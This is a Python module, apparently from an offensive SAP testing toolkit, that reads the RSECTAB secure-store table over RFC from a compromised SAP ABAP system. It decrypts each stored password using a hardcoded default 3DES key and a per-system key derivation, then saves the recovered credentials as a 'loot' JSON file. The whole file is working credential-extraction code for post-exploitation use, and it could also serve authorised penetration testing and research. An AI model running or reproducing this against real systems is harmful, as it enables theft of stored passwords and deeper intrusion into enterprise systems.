"""
sapmap_secstore.py – SAP ABAP Secure Store (RSECTAB) reader and decryptor.

After gaining access to an SAP ABAP system, reads the RSECTAB table via
RFC_READ_TABLE and decrypts each row using the 3DES-based scheme described
in the ERPScan research "All your SAP passwords belong to us" (2014).

Algorithm (Python 3 port of the original Python 2.7 / pyDes implementation):

  Step 1 — decrypt ciphertext with default key (keydef)   → data_pass1
  Step 2 — extract SID and instance number from data_pass1
           derive keyprime = XOR keydef bytes with MD5(SID+instno) nibbles
  Step 3 — decrypt first 136 bytes of data_pass1 with keyprime → data_pass2
  Step 4 — extract password from data_pass2[2 : 2+pass_len]

The "triple-DES" is a manual 3-pass scheme (NOT standard EDE 3DES):
  pass 1: DES-CBC decrypt  with key[16:24]
  pass 2: DES-CBC encrypt  with key[8:16]
  pass 3: DES-CBC decrypt  with key[0:8]
  IV = 8 null bytes for every pass.

Requires pycryptodome:  pip install pycryptodome
"""

import datetime
import hashlib
import json
import os
import traceback

try:
    from Crypto.Cipher import DES as _CryptoDES
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False

import sapmap_rfc

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default 24-byte 3DES key hardcoded in SAP installations (all systems share
# this key unless the admin has configured an individual key).
DEFAULT_KEY_HEX = "b1e09244ec19eb3401dfc846ab225820c71bc376581eb3e4"

# RSECTAB.DATA is RAW(184) = 184 bytes = 368 hex chars
_DATA_LEN_BYTES = 184


# ---------------------------------------------------------------------------
# Internal crypto helpers
# ---------------------------------------------------------------------------

def _require_crypto():
    if not _HAVE_CRYPTO:
        raise RuntimeError(
            "pycryptodome is required for SecStore decryption. "
            "Install with:  pip install pycryptodome"
        )


def _des3_manual(key24: bytes, data: bytes) -> bytes:
    """
    SAP SecStore manual 3-pass DES (CBC, IV=0x00*8):
      pass 1: decrypt  key[16:24]
      pass 2: encrypt  key[8:16]
      pass 3: decrypt  key[0:8]
    """
    iv = b"\x00" * 8

    c1 = _CryptoDES.new(key24[16:24], _CryptoDES.MODE_CBC, iv)
    d = c1.decrypt(data)

    c2 = _CryptoDES.new(key24[8:16], _CryptoDES.MODE_CBC, iv)
    d = c2.encrypt(d)

    c3 = _CryptoDES.new(key24[:8], _CryptoDES.MODE_CBC, iv)
    d = c3.decrypt(d)
    return d


def _derive_keyprime(keydef: bytes, data_pass1: bytes) -> bytes:
    """
    Derive the per-system keyprime by XOR-ing specific bytes of keydef with
    nibbles of MD5(SID + instance_number) embedded at the end of data_pass1.
    Mirrors the keyprime[] array manipulation in the original Python 2.7 script.
    """
    sid    = data_pass1[-44:-41]   # 3 bytes
    instno = data_pass1[-41:-31]   # 10 bytes

    h = hashlib.md5()
    h.update(sid + instno)
    m = h.digest()                 # 16 bytes

    kp = bytearray(keydef)
    kp[1]  ^= m[0] & 0xF0
    kp[6]  ^= m[0] & 0x0F
    kp[7]  ^= m[3] & 0xF0
    kp[10] ^= m[1] & 0xF0
    kp[13] ^= m[1] & 0x0F
    kp[16] ^= m[4] & 0x0F
    kp[19] ^= m[2] & 0xF0
    kp[20] ^= m[2] & 0x0F
    return bytes(kp)


# ---------------------------------------------------------------------------
# Public decrypt function
# ---------------------------------------------------------------------------

def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
    """
    Decrypt one RSECTAB DATA value (hex string, 368 chars).

    Returns a dict:
      password      – decrypted password string  (None on failure)
      password_len  – declared length byte from the structure
      sid           – SID extracted from the decrypted structure
      instance_nr   – installation/instance number extracted
      error         – error message string, or None on success
    """
    result = {
        "password": None,
        "password_len": 0,
        "sid": "",
        "instance_nr": "",
        "error": None,
    }
    try:
        keydef = bytes.fromhex(key_hex)
        data   = bytes.fromhex(data_hex)

        if len(data) != _DATA_LEN_BYTES:
            result["error"] = (
                "unexpected DATA length %d bytes (expected %d)"
                % (len(data), _DATA_LEN_BYTES)
            )
            return result

        # Step 1: decrypt with default/supplied key
        data_pass1 = _des3_manual(keydef, data)

        # Step 2: derive per-system keyprime
        keyprime = _derive_keyprime(keydef, data_pass1)

        # Step 3: decrypt first 136 bytes with keyprime
        data_pass2 = _des3_manual(keyprime, data_pass1[:136])

        # Step 4: parse structure
        #   data_pass2[0:2]    – prefix (2 bytes)
        #   data_pass2[2:111]  – password (up to 109 bytes)
        #   data_pass2[111]    – password length byte
        #   data_pass2[112:116] – magic local
        #   data_pass2[116:120] – magic global salted
        #   data_pass2[120:136] – rec identifier hash
        #   data_pass1[140:143] – SID
        #   data_pass1[143:153] – installation/instance number
        pass_len    = data_pass2[111]
        pass_bytes  = data_pass2[2:2 + min(pass_len, 109)]
        sid         = data_pass1[140:143].rstrip(b"\x00").decode("ascii", errors="replace").strip()
        inst_nr     = data_pass1[143:153].rstrip(b"\x00").decode("ascii", errors="replace").strip()

        result["password"]    = pass_bytes.decode("latin-1", errors="replace")
        result["password_len"] = pass_len
        result["sid"]         = sid
        result["instance_nr"] = inst_nr

    except Exception:
        result["error"] = traceback.format_exc(limit=2)

    return result


# ---------------------------------------------------------------------------
# Main entry point: read RSECTAB and decrypt all rows
# ---------------------------------------------------------------------------

def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
    """
    1. Read RSECTAB via RFC_READ_TABLE (fields: IDENT, DATA).
    2. Decrypt each row.
    3. Return a list of dicts: ident, password, sid, instance_nr, error.
    """
    _require_crypto()

    rows = sapmap_rfc.read_table(
        node,
        "RSECTAB",
        fields=["IDENT", "DATA"],
        where="",
        max_rows=9999,
        creds=creds,
    )

    results = []
    for row in rows:
        ident    = (row.get("IDENT") or "").strip()
        data_hex = (row.get("DATA")  or "").strip()
        # RFC_READ_TABLE returns RAW fields as uppercase hex; normalise
        data_hex = data_hex.replace(" ", "").upper()

        entry = {"ident": ident}

        if not data_hex:
            entry["error"] = "empty DATA field"
            results.append(entry)
            continue

        if len(data_hex) != _DATA_LEN_BYTES * 2:
            entry["error"] = (
                "DATA field length %d chars (expected %d)"
                % (len(data_hex), _DATA_LEN_BYTES * 2)
            )
            results.append(entry)
            continue

        dec = decrypt_entry(data_hex, key_hex)
        entry.update(dec)
        results.append(entry)

    return results


# ---------------------------------------------------------------------------
# Loot persistence
# ---------------------------------------------------------------------------

def save_loot(node_sid: str, results: list, states_dir: str) -> str:
    """Save decrypted results as JSON loot file. Returns absolute file path."""
    os.makedirs(states_dir, exist_ok=True)
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(states_dir, f"secstore_{node_sid}_{ts}.json")
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    return filename
